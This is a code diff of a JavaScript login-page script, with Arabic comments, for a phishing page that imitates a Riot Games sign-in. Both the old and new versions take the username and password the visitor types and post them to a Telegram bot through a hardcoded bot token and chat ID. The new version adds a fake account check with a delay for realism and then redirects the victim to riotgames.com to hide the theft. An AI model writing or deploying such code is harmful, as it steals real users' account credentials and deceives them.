@@ -1,58 +1,67 @@
-const inputs = document.querySelectorAll('.input');
-const button = document.querySelector('.login-btn');
+function checkInputs() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const loginBtn = document.getElementById("login-btn");
 
-const TELEGRAM_BOT_TOKEN = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM" // استبدلها بالتوكن الخاص بك
-const TELEGRAM_CHAT_ID = "6687453395"; // استبدلها بمعرف الدردشة
-
-const handleInputEvent = (event) => {
-    const input = event.target;
-    const span = input.closest('.login-user').querySelector('span');
-
-    if (event.type === 'focus' || input.value.trim() !== '') {
-        span.classList.add('span-active');
+    if (username !== "" && password !== "") {
+        loginBtn.removeAttribute("disabled");
     } else {
-        span.classList.remove('span-active');
+        loginBtn.setAttribute("disabled", "true");
+    }
+}
+
+async function validateAndSend() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const errorMessage = document.getElementById("error-message");
+
+    if (!isValidUsername(username)) {
+        errorMessage.textContent = "Invalid username format.";
+        errorMessage.style.display = "block";
+        return;
     }
 
-    // التحقق من الإدخال وتمكين الزر
-    const [user, password] = inputs;
-    button.disabled = !(user.value.trim() && password.value.trim().length >= 8);
-};
+    if (!isValidPassword(password)) {
+        errorMessage.textContent = "Password must be at least 8 characters.";
+        errorMessage.style.display = "block";
+        return;
+    }
 
-// إرسال البيانات إلى تيليغرام
-const sendToTelegram = () => {
-    const [user, password] = inputs;
-    const message = `🔒 **تسجيل دخول جديد**\n👤 *المستخدم:* ${user.value}\n🔑 *كلمة المرور:* ${password.value}`;
-    
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const params = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "Markdown"
-    };
+    errorMessage.style.display = "none";
 
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(params),
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            alert("✅ تم إرسال المعلومات بنجاح!");
-        } else {
-            alert("❌ فشل الإرسال! تحقق من إعدادات البوت.");
-        }
-    })
-    .catch(error => console.error("خطأ في الإرسال:", error));
-};
+    // التحقق من الحساب عبر Riot Games (محاكاة)
+    const isValid = await checkRiotAccount(username, password);
+    if (!isValid) {
+        errorMessage.textContent = "Incorrect username or password.";
+        errorMessage.style.display = "block";
+        return;
+    }
 
-// تطبيق الأحداث
-inputs.forEach((input) => {
-    input.addEventListener('focus', handleInputEvent);
-    input.addEventListener('focusout', handleInputEvent);
-    input.addEventListener('input', handleInputEvent);
-});
+    sendToTelegram(username, password);
 
-// تشغيل الإرسال عند الضغط على الزر
-button.addEventListener("click", sendToTelegram);
+    window.location.href = "https://www.riotgames.com/";
+}
+
+function isValidUsername(username) {
+    const regex = /^[a-zA-Z0-9._-]{3,16}$/; // اسم مستخدم صالح وفقًا لمتطلبات Riot Games
+    return regex.test(username);
+}
+
+function isValidPassword(password) {
+    return password.length >= 8;
+}
+
+async function checkRiotAccount(username, password) {
+    // محاكاة تحقق من Riot Games (لا يمكن فعل ذلك مباشرة)
+    await new Promise(resolve => setTimeout(resolve, 1000)); // تأخير للتأثير الواقعي
+    return username === "validUser" && password === "ValidPass123"; // محاكاة فقط
+}
+
+function sendToTelegram(username, password) {
+    const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
+    const chatId = "6687453395";
+    const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .catch(error => console.error("Error sending to Telegram:", error));
+}
